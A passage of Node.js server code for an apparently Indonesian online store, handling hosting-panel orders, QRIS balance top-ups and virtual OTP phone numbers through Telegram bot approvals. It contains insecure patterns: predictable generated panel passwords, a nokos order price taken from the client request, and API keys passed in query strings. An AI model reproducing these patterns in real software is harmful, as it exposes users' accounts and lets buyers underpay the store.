    `🆔 ID: <code>${order.id}</code>\n\n` +
    `Klik tombol di bawah untuk approve / reject.`;

  const replyMarkup = {
    inline_keyboard: [
      [
        { text: '✅ APPROVE', callback_data: `panel_approve_${order.id}` },
        { text: '❌ REJECT',  callback_data: `panel_reject_${order.id}` },
      ],
      [
        { text: '👁 LIHAT BUKTI', callback_data: `panel_view_${order.id}` },
      ],
    ],
  };

  console.log(`[STORE-PANEL] Sending notification to owner ${OWNER_ID}. Proof exists: ${proofExists}`);

  // Try with photo first (if proof exists)
  if (proofExists) {
    try {
      await bot.sendPhoto(OWNER_ID, proofPath, {
        caption,
        parse_mode: 'HTML',
        reply_markup: replyMarkup,
      });
      console.log(`[STORE-PANEL] ✅ Notification with photo sent to owner ${OWNER_ID}`);
      return;
    } catch (err) {
      console.error('[STORE-PANEL] sendPhoto failed, falling back to text:', err.message);
    }
  }

  // Fallback: text-only message
  try {
    await bot.sendMessage(OWNER_ID, caption, {
      parse_mode: 'HTML',
      reply_markup: replyMarkup,
    });
    console.log(`[STORE-PANEL] ✅ Notification (text-only) sent to owner ${OWNER_ID}`);
  } catch (err) {
    console.error('[STORE-PANEL] sendMessage also failed:', err.message);
    // Last resort: try without parse_mode (plain text)
    try {
      const plainCaption = caption.replace(/<[^>]+>/g, '').replace(/&/g, '&');
      await bot.sendMessage(OWNER_ID, plainCaption, { reply_markup: replyMarkup });
      console.log(`[STORE-PANEL] ✅ Plain text notification sent to owner ${OWNER_ID}`);
    } catch (err2) {
      console.error('[STORE-PANEL] All notification attempts failed:', err2.message);
    }
  }
}

async function notifyOwnerTopupRequest(reqObj) {
  if (!bot || !OWNER_ID) return;
  const proofPath = reqObj.proofFile ? path.join(__dirname, reqObj.proofFile) : null;
  const caption =
    `💳 *NEW TOP UP SALDO REQUEST*\n\n` +
    `👤 Username: *${reqObj.username}*\n` +
    `💰 Nominal: *Rp ${Number(reqObj.nominal).toLocaleString('id-ID')}*\n` +
    `🕒 Waktu: ${new Date(reqObj.createdAt).toLocaleString('id-ID')}\n` +
    `🆔 ID: \`${reqObj.id}\`\n\n` +
    `Klik tombol di bawah untuk approve / reject.`;

  const opts = {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ APPROVE', callback_data: `topup_approve_${reqObj.id}` },
          { text: '❌ REJECT',  callback_data: `topup_reject_${reqObj.id}` },
        ],
        [
          { text: '👁 LIHAT BUKTI', callback_data: `topup_view_${reqObj.id}` },
        ],
      ],
    },
  };

  try {
    if (proofPath && fs.existsSync(proofPath)) {
      await bot.sendPhoto(OWNER_ID, proofPath, { ...opts, caption });
    } else {
      await bot.sendMessage(OWNER_ID, caption, opts);
    }
    console.log(`[STORE-TOPUP] Notifikasi topup ${reqObj.id} terkirim ke owner ${OWNER_ID}`);
  } catch (err) {
    console.error('[STORE-TOPUP] Gagal kirim notifikasi:', err.message);
  }
}

// ============================================================
// Telegram callback handlers for panel & topup
// ============================================================
bot.on('callback_query', async (query) => {
  try {
    const data = query.data || '';
    if (!data.startsWith('panel_') && !data.startsWith('topup_')) return;

    const fromId = query.from.id;
    const chatId = query.message?.chat?.id;
    if (!chatId) return;

    if (!isDeveloper(fromId)) {
      return bot.answerCallbackQuery(query.id, {
        text: '❌ Kamu tidak punya izin.',
        show_alert: true,
      });
    }

    const m = data.match(/^(panel|topup)_(approve|reject|view)_(.+)$/);
    if (!m) return bot.answerCallbackQuery(query.id, { text: 'Format callback tidak dikenal' });

    const kind = m[1];
    const action = m[2];
    const orderId = m[3];
    const decidedBy = resolveOwnerNameFromTelegram(fromId);

    const orders = loadStoreOrders();
    const idx = orders.findIndex(o => o.id === orderId);
    if (idx === -1) {
      return bot.answerCallbackQuery(query.id, { text: 'Order tidak ditemukan', show_alert: true });
    }
    const order = orders[idx];

    if (action === 'view') {
      const proofPath = order.proofFile ? path.join(__dirname, order.proofFile) : null;
      if (!proofPath || !fs.existsSync(proofPath)) {
        return bot.answerCallbackQuery(query.id, { text: 'File bukti hilang', show_alert: true });
      }
      const label = kind === 'panel'
        ? `${order.panelName} • Rp ${Number(order.price).toLocaleString('id-ID')}`
        : `Top Up Rp ${Number(order.nominal).toLocaleString('id-ID')}`;
      await bot.sendPhoto(chatId, proofPath, {
        caption: `👁 *Bukti Transfer*\n👤 ${order.username}\n📦 ${label}\n🆔 \`${order.id}\``,
        parse_mode: 'Markdown',
      });
      return bot.answerCallbackQuery(query.id, { text: 'Bukti dikirim' });
    }

    if (order.status !== 'pending') {
      return bot.answerCallbackQuery(query.id, { text: `Sudah ${order.status}`, show_alert: true });
    }

    // PANEL APPROVE
    if (kind === 'panel' && action === 'approve') {
      try {
        const headers = { "Accept": "application/json", "Content-Type": "application/json", "Authorization": `Bearer ${panelConfig.apikey}` };
        const password = order.username + "001";
        const email = `${order.username.toLowerCase()}@gmail.com`;

        const userRes = await axios.post(`${panelConfig.domain}/api/application/users`, {
          email, username: order.username.toLowerCase(), first_name: order.username, last_name: "User", language: "en", password
        }, { headers });

        const panelUser = userRes.data.attributes;

        await axios.post(`${panelConfig.domain}/api/application/servers`, {
          name: `${order.username} Server`,
          user: panelUser.id,
          egg: panelConfig.eggId,
          docker_image: panelConfig.image,
          startup: panelConfig.startup,
          environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
          limits: { memory: order.ram || 0, swap: 0, disk: order.disk || 0, io: 500, cpu: order.cpu || 0 },
          feature_limits: { databases: 1, backups: 1, allocations: 1 },
          deploy: { locations: [panelConfig.locationId], dedicated_ip: false, port_range: [] }
        }, { headers });

        order.status = 'approved';
        order.decidedAt = new Date().toISOString();
        order.decidedBy = decidedBy;
        order.panelData = { username: panelUser.username, password, login: panelConfig.domain };
        orders[idx] = order;
        saveStoreOrders(orders);

        try {
          await bot.editMessageCaption(
            `✅ *APPROVED* — Panel ${order.panelName} untuk ${order.username}\n` +
            `💰 Rp ${Number(order.price).toLocaleString('id-ID')}\n` +
            `🌐 Login: ${panelConfig.domain}\n` +
            `🛠 Decided by: ${decidedBy}`,
            { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'Markdown' }
          );
        } catch (_) {}

        await bot.answerCallbackQuery(query.id, { text: `✅ Panel approved: ${order.username}` });

        sendTestimoniToChannel({
          username: order.username,
          productName: order.panelName,
          price: order.price,
          type: 'panel'
        }).catch(() => {});
        return;
      } catch (e) {
        console.error('[STORE-PANEL] approve error:', e.message);
        return bot.answerCallbackQuery(query.id, {
          text: `❌ Gagal buat panel: ${e.response?.data?.errors?.[0]?.detail || e.message}`,
          show_alert: true,
        });
      }
    }

    if (kind === 'panel' && action === 'reject') {
      order.status = 'rejected';
      order.decidedAt = new Date().toISOString();
      order.decidedBy = decidedBy;
      order.rejectReason = 'Ditolak via Telegram';
      orders[idx] = order;
      saveStoreOrders(orders);

      try {
        await bot.editMessageCaption(
          `❌ *REJECTED* — Panel ${order.panelName} untuk ${order.username}\n` +
          `📝 Alasan: ${order.rejectReason}\n` +
          `🛠 Decided by: ${decidedBy}`,
          { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'Markdown' }
        );
      } catch (_) {}

      await bot.answerCallbackQuery(query.id, { text: `❌ Panel rejected: ${order.username}` });
      return;
    }

    if (kind === 'topup' && action === 'approve') {
      const newSaldo = addUserSaldo(order.username, order.nominal);
      order.status = 'topup_approved';
      order.decidedAt = new Date().toISOString();
      order.decidedBy = decidedBy;
      order.newSaldo = newSaldo;
      orders[idx] = order;
      saveStoreOrders(orders);

      try {
        await bot.editMessageCaption(
          `✅ *TOP UP APPROVED* — ${order.username}\n` +
          `💰 Nominal: Rp ${Number(order.nominal).toLocaleString('id-ID')}\n` +
          `💼 Saldo sekarang: Rp ${Number(newSaldo).toLocaleString('id-ID')}\n` +
          `🛠 Decided by: ${decidedBy}`,
          { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'Markdown' }
        );
      } catch (_) {}

      await bot.answerCallbackQuery(query.id, { text: `✅ Top up approved: Rp ${order.nominal.toLocaleString('id-ID')}` });

      sendTestimoniToChannel({
        username: order.username,
        productName: `Top Up Saldo Toko Mbud`,
        price: order.nominal,
        type: 'topup'
      }).catch(() => {});
      return;
    }

    if (kind === 'topup' && action === 'reject') {
      order.status = 'topup_rejected';
      order.decidedAt = new Date().toISOString();
      order.decidedBy = decidedBy;
      order.rejectReason = 'Ditolak via Telegram';
      orders[idx] = order;
      saveStoreOrders(orders);

      try {
        await bot.editMessageCaption(
          `❌ *TOP UP REJECTED* — ${order.username}\n` +
          `📝 Alasan: ${order.rejectReason}\n` +
          `🛠 Decided by: ${decidedBy}`,
          { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'Markdown' }
        );
      } catch (_) {}

      await bot.answerCallbackQuery(query.id, { text: `❌ Top up rejected` });
      return;
    }
  } catch (err) {
    console.error('[STORE-TELEGRAM] callback_query error:', err.message);
    try { await bot.answerCallbackQuery(query.id, { text: 'Internal error', show_alert: true }); } catch (_) {}
  }
});

// ============================================================
// PANEL ENDPOINTS
// ============================================================

// List panel products
app.get('/store/panels', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const panels = [
    { id: 'panel_unlimited', name: 'Panel Unlimited', ram: 0, disk: 0, cpu: 0, price: 2500, desc: 'RAM/Disk/CPU Unlimited' },
    { id: 'panel_1gb', name: 'Panel 1GB', ram: 1024, disk: 1024, cpu: 100, price: 750, desc: '1GB RAM, 1GB Disk' },
    { id: 'panel_2gb', name: 'Panel 2GB', ram: 2048, disk: 2048, cpu: 200, price: 1500, desc: '2GB RAM, 2GB Disk' },
    { id: 'panel_4gb', name: 'Panel 4GB', ram: 4096, disk: 4096, cpu: 400, price: 3000, desc: '4GB RAM, 4GB Disk' },
  ];
  res.json({ valid: true, panels });
});

// Order panel (manual approval flow)
app.post('/store/orderPanel', async (req, res) => {
  const { key, panelId, proofBase64, proofMime } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: 'User not found' });

  const panels = [
    { id: 'panel_unlimited', name: 'Panel Unlimited', ram: 0, disk: 0, cpu: 0, price: 2500 },
    { id: 'panel_1gb', name: 'Panel 1GB', ram: 1024, disk: 1024, cpu: 100, price: 750 },
    { id: 'panel_2gb', name: 'Panel 2GB', ram: 2048, disk: 2048, cpu: 200, price: 1500 },
    { id: 'panel_4gb', name: 'Panel 4GB', ram: 4096, disk: 4096, cpu: 400, price: 3000 },
  ];
  const panel = panels.find(p => p.id === panelId);
  if (!panel) return res.json({ valid: false, message: 'Panel tidak ditemukan' });

  if (!proofBase64 || typeof proofBase64 !== 'string' || proofBase64.length < 100) {
    return res.json({ valid: false, message: 'Bukti pembayaran wajib diupload' });
  }

  const orders = loadStoreOrders();
  const pending = orders.find(o =>
    o.username === user.username && o.type === 'panel' && o.status === 'pending'
  );
  if (pending) {
    return res.json({
      valid: false,
      message: 'Kamu masih punya order panel pending. Tunggu owner konfirmasi dulu.'
    });
  }

  let rawB64 = proofBase64;
  let mime = proofMime || 'image/jpeg';
  const m = proofBase64.match(/^data:([a-zA-Z0-9/+.-]+);base64,(.+)$/);
  if (m) { mime = m[1]; rawB64 = m[2]; }
  let ext = 'jpg';
  if (mime.includes('png')) ext = 'png';
  else if (mime.includes('webp')) ext = 'webp';

  const orderId = `panel_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`;
  const proofFileName = `${orderId}.${ext}`;
  const proofPath = path.join(storeProofDir, proofFileName);

  try {
    fs.writeFileSync(proofPath, Buffer.from(rawB64, 'base64'));
  } catch (e) {
    return res.json({ valid: false, message: 'Gagal menyimpan bukti: ' + e.message });
  }

  const order = {
    id: orderId,
    type: 'panel',
    username: user.username,
    panelId: panel.id,
    panelName: panel.name,
    ram: panel.ram, disk: panel.disk, cpu: panel.cpu,
    price: panel.price,
    proofFile: `store_proofs/${proofFileName}`,
    status: 'pending',
    createdAt: new Date().toISOString(),
    decidedAt: null,
    decidedBy: null,
    rejectReason: null,
    panelData: null,
  };
  orders.push(order);
  saveStoreOrders(orders);

  console.log(`[STORE-PANEL] Order ${orderId} dari ${user.username} panel ${panel.name} (Rp${panel.price})`);

  notifyOwnerPanelOrder(order).catch(() => {});

  return res.json({ valid: true, order });
});

// Approve panel (owner only)
app.post('/store/approvePanel', async (req, res) => {
  const { key, orderId } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') return res.json({ valid: false, message: 'Owner only' });

  const orders = loadStoreOrders();
  const idx = orders.findIndex(o => o.id === orderId);
  if (idx === -1) return res.json({ valid: false, message: 'Order not found' });
  const order = orders[idx];
  if (order.status !== 'pending') return res.json({ valid: false, message: 'Already processed' });

  try {
    const headers = { "Accept": "application/json", "Content-Type": "application/json", "Authorization": `Bearer ${panelConfig.apikey}` };
    const password = order.username + "001";
    const email = `${order.username.toLowerCase()}@gmail.com`;

    const userRes = await axios.post(`${panelConfig.domain}/api/application/users`, {
      email, username: order.username.toLowerCase(), first_name: order.username, last_name: "User", language: "en", password
    }, { headers });

    const panelUser = userRes.data.attributes;

    await axios.post(`${panelConfig.domain}/api/application/servers`, {
      name: `${order.username} Server`,
      user: panelUser.id,
      egg: panelConfig.eggId,
      docker_image: panelConfig.image,
      startup: panelConfig.startup,
      environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
      limits: { memory: order.ram || 0, swap: 0, disk: order.disk || 0, io: 500, cpu: order.cpu || 0 },
      feature_limits: { databases: 1, backups: 1, allocations: 1 },
      deploy: { locations: [panelConfig.locationId], dedicated_ip: false, port_range: [] }
    }, { headers });

    order.status = 'approved';
    order.decidedAt = new Date().toISOString();
    order.decidedBy = owner.username;
    order.panelData = { username: panelUser.username, password, login: panelConfig.domain };
    orders[idx] = order;
    saveStoreOrders(orders);

    sendTestimoniToChannel({
      username: order.username,
      productName: order.panelName,
      price: order.price,
      type: 'panel'
    }).catch(() => {});

    res.json({ valid: true, order });
  } catch (e) {
    res.json({ valid: false, message: e.response?.data?.errors?.[0]?.detail || e.message });
  }
});

// Reject panel (owner only)
app.post('/store/rejectPanel', (req, res) => {
  const { key, orderId, reason } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') return res.json({ valid: false, message: 'Owner only' });

  const orders = loadStoreOrders();
  const idx = orders.findIndex(o => o.id === orderId);
  if (idx === -1) return res.json({ valid: false, message: 'Order not found' });
  const order = orders[idx];
  if (order.status !== 'pending') return res.json({ valid: false, message: 'Already processed' });

  order.status = 'rejected';
  order.decidedAt = new Date().toISOString();
  order.decidedBy = owner.username;
  order.rejectReason = reason || 'Ditolak oleh owner';
  orders[idx] = order;
  saveStoreOrders(orders);

  res.json({ valid: true, order });
});

// List pending panel/topup orders (owner only)
app.get('/store/pendingOrders', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') return res.json({ valid: false, message: 'Owner only' });
  const orders = loadStoreOrders().filter(o => o.status === 'pending');
  res.json({ valid: true, orders });
});

// Stream proof image (owner only)
app.get('/store/proof', (req, res) => {
  const { key, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });

  const orders = loadStoreOrders();
  const o = orders.find(x => x.id === id);
  if (!o || !o.proofFile) return res.status(404).json({ valid: false });

  const fp = path.join(__dirname, o.proofFile);
  if (!fs.existsSync(fp)) return res.status(404).json({ valid: false });

  const safePath = path.resolve(fp);
  if (!safePath.startsWith(storeProofDir)) return res.status(400).json({ valid: false });

  return res.sendFile(safePath);
});

// ============================================================
// SALDO & TOP-UP ENDPOINTS
// ============================================================

app.get('/store/saldo', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const saldo = getUserSaldo(user.username);
  const orders = loadStoreOrders();
  const pendingTopup = orders.find(o =>
    o.username === user.username && o.type === 'topup' && o.status === 'pending'
  );
  res.json({ valid: true, saldo, pendingTopup: pendingTopup || null });
});

// ── AUTO TOP UP via QRIS (Orkut payment gateway) ──
// Step 1: Create QRIS — POST /store/topupCreate { key, nominal }
//   Returns: { valid, transactionId, amount, qrisImageUrl, qrString, expiresAt }
app.post('/store/topupCreate', async (req, res) => {
  const { key, nominal } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: 'User not found' });

  const amt = Number(nominal);
  if (!amt || amt < 1000) return res.json({ valid: false, message: 'Nominal minimal Rp 1.000' });
  if (amt > 1000000) return res.json({ valid: false, message: 'Nominal maksimal Rp 1.000.000' });

  // Block if user has unpaid active topup
  for (const [txId, info] of topupTracker.entries()) {
    if (info.username === user.username && !info.paid && (Date.now() - info.createdAt) < TOPUP_EXPIRE_MS) {
      return res.json({
        valid: false,
        message: 'Kamu masih punya QRIS top up aktif. Selesaikan atau tunggu expired (5 menit).',
        activeTransactionId: txId,
        qrisImageUrl: info.qrisImageUrl,
        qrString: info.qrString,
        amount: info.amount,
        expiresAt: info.createdAt + TOPUP_EXPIRE_MS,
      });
    }
  }

  // Create QRIS via payment gateway
  const qris = await createTopupQris(amt);
  if (!qris || !qris.transactionId) {
    return res.json({ valid: false, message: 'Gagal membuat QRIS. Coba lagi nanti.' });
  }

  // Save to store_orders
  const orders = loadStoreOrders();
  const topupOrder = {
    id: qris.transactionId,
    type: 'topup',
    username: user.username,
    nominal: amt,
    proofFile: null, // no manual proof for auto-topup
    status: 'pending',
    paymentMethod: 'auto-qris',
    qrisImageUrl: qris.qrisImageUrl,
    qrString: qris.qrString,
    createdAt: new Date().toISOString(),
    decidedAt: null,
    decidedBy: null,
    rejectReason: null,
    newSaldo: null,
  };
  orders.push(topupOrder);
  saveStoreOrders(orders);

  // Track in memory for auto-polling
  topupTracker.set(qris.transactionId, {
    username: user.username,
    amount: amt,
    createdAt: Date.now(),
    paid: false,
    qrisImageUrl: qris.qrisImageUrl,
    qrString: qris.qrString,
  });

  console.log(`[STORE-TOPUP] Auto-QRIS created: ${qris.transactionId} for ${user.username} Rp${amt}`);

  return res.json({
    valid: true,
    transactionId: qris.transactionId,
    amount: qris.amount,
    qrisImageUrl: qris.qrisImageUrl,
    qrString: qris.qrString,
    expiresAt: Date.now() + TOPUP_EXPIRE_MS,
  });
});

// Step 2: Check topup status — GET /store/topupStatus?key=&transactionId=
//   Server checks mutasi, if paid → auto add saldo + return newSaldo
app.get('/store/topupStatus', async (req, res) => {
  const { key, transactionId } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const info = topupTracker.get(transactionId);
  if (!info) {
    // Either expired or never existed — check store_orders if it was approved
    const orders = loadStoreOrders();
    const o = orders.find(x => x.id === transactionId && x.username === user.username);
    if (o && o.status === 'topup_approved') {
      return res.json({ valid: true, status: 'paid', newSaldo: getUserSaldo(user.username) });
    }
    return res.json({ valid: false, status: 'expired', message: 'Top up expired atau tidak ditemukan' });
  }

  // Expired check
  if (Date.now() - info.createdAt > TOPUP_EXPIRE_MS) {
    topupTracker.delete(transactionId);
    return res.json({ valid: true, status: 'expired', message: 'Top up expired. Silakan buat QRIS baru.' });
  }

  // Already paid?
  if (info.paid) {
    return res.json({ valid: true, status: 'paid', newSaldo: getUserSaldo(user.username) });
  }

  // Check via payment gateway
  const result = await checkTopupStatus(transactionId, info.amount);
  if (result.paid) {
    info.paid = true;
    const newSaldo = addUserSaldo(info.username, info.amount);
    console.log(`[TOPUP-STATUS] ${transactionId} PAID (manual check). Added Rp ${info.amount} to ${info.username}. New saldo: Rp ${newSaldo}`);

    // Mark in store_orders
    const orders = loadStoreOrders();
    const idx = orders.findIndex(o => o.id === transactionId);
    if (idx !== -1) {
      orders[idx].status = 'topup_approved';
      orders[idx].decidedAt = new Date().toISOString();
      orders[idx].decidedBy = 'auto-qris';
      orders[idx].newSaldo = newSaldo;
      saveStoreOrders(orders);
    }

    // Send testimoni
    sendTestimoniToChannel({
      username: info.username,
      productName: 'Top Up Saldo (Auto QRIS)',
      price: info.amount,
      type: 'topup',
    }).catch(() => {});

    return res.json({ valid: true, status: 'paid', newSaldo });
  }

  // Still pending
  return res.json({
    valid: true,
    status: 'pending',
    expiresAt: info.createdAt + TOPUP_EXPIRE_MS,
    timeLeft: Math.max(0, TOPUP_EXPIRE_MS - (Date.now() - info.createdAt)),
  });
});

// Cancel active topup (clear tracker)
app.post('/store/topupCancel', (req, res) => {
  const { key, transactionId } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  topupTracker.delete(transactionId);
  return res.json({ valid: true });
});

app.post('/store/approveTopup', (req, res) => {
  const { key, topupId } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') return res.json({ valid: false, message: 'Owner only' });

  const orders = loadStoreOrders();
  const idx = orders.findIndex(o => o.id === topupId);
  if (idx === -1) return res.json({ valid: false, message: 'Top up not found' });
  const order = orders[idx];
  if (order.status !== 'pending') return res.json({ valid: false, message: 'Already processed' });

  const newSaldo = addUserSaldo(order.username, order.nominal);
  order.status = 'topup_approved';
  order.decidedAt = new Date().toISOString();
  order.decidedBy = owner.username;
  order.newSaldo = newSaldo;
  orders[idx] = order;
  saveStoreOrders(orders);

  sendTestimoniToChannel({
    username: order.username,
    productName: `Top Up Saldo Toko Mbud`,
    price: order.nominal,
    type: 'topup'
  }).catch(() => {});

  res.json({ valid: true, order, newSaldo });
});

app.post('/store/rejectTopup', (req, res) => {
  const { key, topupId, reason } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== 'owner') return res.json({ valid: false, message: 'Owner only' });

  const orders = loadStoreOrders();
  const idx = orders.findIndex(o => o.id === topupId);
  if (idx === -1) return res.json({ valid: false, message: 'Top up not found' });
  const order = orders[idx];
  if (order.status !== 'pending') return res.json({ valid: false, message: 'Already processed' });

  order.status = 'topup_rejected';
  order.decidedAt = new Date().toISOString();
  order.decidedBy = owner.username;
  order.rejectReason = reason || 'Ditolak oleh owner';
  orders[idx] = order;
  saveStoreOrders(orders);

  res.json({ valid: true, order });
});

// ============================================================
// OMHC NOKOS — RUMAHOTP API (4-step flow)
// ============================================================

// Step 1: List services
app.get('/store/nokos/services', async (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  try {
    const r = await axios.get(`${NOKOS_API_BASE}/v2/services`, {
      headers: { "x-apikey": NOKOS_API_KEY, "accept": "application/json" },
      timeout: 10000,
    });
    // API returns { success, data: [...] }
    if (r.data && r.data.success) {
      res.json({ valid: true, services: r.data.data });
    } else {
      res.json({ valid: false, message: r.data?.error?.message || 'Gagal mengambil daftar layanan' });
    }
  } catch (e) {
    res.json({ valid: false, message: e.response?.data?.error?.message || e.message });
  }
});

// Step 2: List countries with pricelist for a service
app.get('/store/nokos/countries', async (req, res) => {
  const { key, serviceId } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  if (!serviceId) return res.json({ valid: false, message: 'serviceId required' });
  try {
    const r = await axios.get(`${NOKOS_API_BASE}/v2/countries?service_id=${encodeURIComponent(serviceId)}`, {
      headers: { "x-apikey": NOKOS_API_KEY, "accept": "application/json" },
      timeout: 10000,
    });
    if (r.data && r.data.success) {
      // Filter only countries with available pricelist, attach markup price
      const list = (r.data.data || []).filter(c => c.pricelist && c.pricelist.length > 0);
      res.json({ valid: true, countries: list });
    } else {
      res.json({ valid: false, message: r.data?.error?.message || 'Gagal mengambil negara' });
    }
  } catch (e) {
    res.json({ valid: false, message: e.response?.data?.error?.message || e.message });
  }
});

// Step 3: List operators for a country+provider
app.get('/store/nokos/operators', async (req, res) => {
  const { key, countryName, providerId } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  try {
    const r = await axios.get(
      `${NOKOS_API_BASE}/v2/operators?country=${encodeURIComponent(countryName || '')}&provider_id=${encodeURIComponent(providerId || '')}`,
      { headers: { "x-apikey": NOKOS_API_KEY, "accept": "application/json" }, timeout: 10000 }
    );
    if (r.data && r.data.success) {
      res.json({ valid: true, operators: r.data.data || [] });
    } else {
      res.json({ valid: false, message: r.data?.error?.message || 'Gagal mengambil operator' });
    }
  } catch (e) {
    res.json({ valid: false, message: e.response?.data?.error?.message || e.message });
  }
});

// Step 4: Order nomor virtual (uses saldo, supports retry)
// Body: { key, numberId, providerId, operatorId (optional), price, serviceName, countryName, pricelistItem }
app.post('/store/orderNokos', async (req, res) => {
  const { key, numberId, providerId, operatorId, price, serviceName, countryName } = req.body || {};
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: 'User not found' });

  if (!numberId || !providerId) {
    return res.json({ valid: false, message: 'numberId dan providerId wajib diisi' });
  }

  const finalPrice = Number(price) || NOKOS_MARKUP;

  // Check saldo
  const saldo = getUserSaldo(user.username);
  if (saldo < finalPrice) {
    return res.json({
      valid: false,
      message: `Saldo tidak cukup. Saldo kamu Rp ${saldo.toLocaleString('id-ID')}, butuh Rp ${finalPrice.toLocaleString('id-ID')}. Silakan top up dulu.`,
      insufficientSaldo: true,
      saldo,
      need: finalPrice,
    });
  }

  // Deduct saldo FIRST (refund if order fails)
  const deducted = deductUserSaldo(user.username, finalPrice);
  if (!deducted) {
    return res.json({
      valid: false,
      message: 'Gagal memotong saldo. Coba lagi.',
      insufficientSaldo: true,
    });
  }

  // Retry loop (mirrors reference rumahOtp.js)
  let lastErr = '';
  let orderData = null;

  for (let attempt = 1; attempt <= NOKOS_MAX_RETRY; attempt++) {
    try {
      let url = `${NOKOS_API_BASE}/v2/orders?number_id=${encodeURIComponent(numberId)}&provider_id=${encodeURIComponent(providerId)}`;
      if (operatorId && operatorId !== 'any' && operatorId !== '') {
        url += `&operator_id=${encodeURIComponent(operatorId)}`;
      }

      if (attempt > 1) await new Promise(r => setTimeout(r, 2000));

      const r = await axios.get(url, {
        headers: { "x-apikey": NOKOS_API_KEY, "accept": "application/json" },
        timeout: 15000,
      });

      if (r.data && r.data.success) {
        orderData = r.data.data;
        break;
      }

      lastErr = r.data?.error?.message || r.data?.message || 'Gagal dari provider';
      const lowErr = lastErr.toLowerCase();
      if (lowErr.includes('stock') || lowErr.includes('stok') || lowErr.includes('out of')) break;
    } catch (reqErr) {
      lastErr = reqErr.response?.data?.error?.message || reqErr.message || 'Timeout / koneksi gagal';
      if (attempt === NOKOS_MAX_RETRY) break;
    }
  }

  if (!orderData) {
    // Refund saldo
    addUserSaldo(user.username, finalPrice);
    return res.json({
      valid: false,
      message: `Order gagal: ${lastErr}. Saldo Rp ${finalPrice.toLocaleString('id-ID')} sudah dikembalikan.`,
      refunded: true,
    });
  }

  // Save order
  const orders = loadStoreOrders();
  const orderId = `nokos_${orderData.order_id}`;
  orders.push({
    id: orderId,
    type: 'nokos',
    username: user.username,
    phoneNumber: orderData.phone_number,
    rumahOtpId: orderData.order_id,
    service: serviceName || orderData.service,
    country: countryName || '',
    numberId, providerId, operatorId: operatorId || 'any',
    price: finalPrice,
    status: 'active',
    createdAt: new Date().toISOString(),
  });
  saveStoreOrders(orders);

  const newSaldo = getUserSaldo(user.username);

  // Send testimoni to @kiuchan12
  sendTestimoniToChannel({
    username: user.username,
    productName: `${serviceName || orderData.service || 'Omhc Nokos'} (${countryName || ''})`,
    price: finalPrice,
    type: 'nokos'
  }).catch(() => {});

  res.json({
    valid: true,
    order: orderData,
    price: finalPrice,
    newSaldo,
  });
});

// Check OTP status
app.get('/store/nokos/status', async (req, res) => {
  const { key, orderId } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  try {
    const r = await axios.get(
      `${NOKOS_API_BASE}/v1/orders/get_status?order_id=${encodeURIComponent(orderId)}`,
      { headers: { "x-apikey": NOKOS_API_KEY, "accept": "application/json" }, timeout: 10000 }
    );
    if (r.data && r.data.success) {
      res.json({ valid: true, status: r.data.data });
    } else {
      res.json({ valid: false, message: r.data?.error?.message || 'Status tidak diketahui' });
    }
  } catch (e) {
    res.json({ valid: false, message: e.response?.data?.error?.message || e.message });
  }
});

// Cancel nokos order + refund saldo
// Body: { key, orderId }
app.post('/store/nokos/cancel', async (req, res) => {
  const { key, orderId } = req.body || {};
  const keyInfo = activeKeys[key];
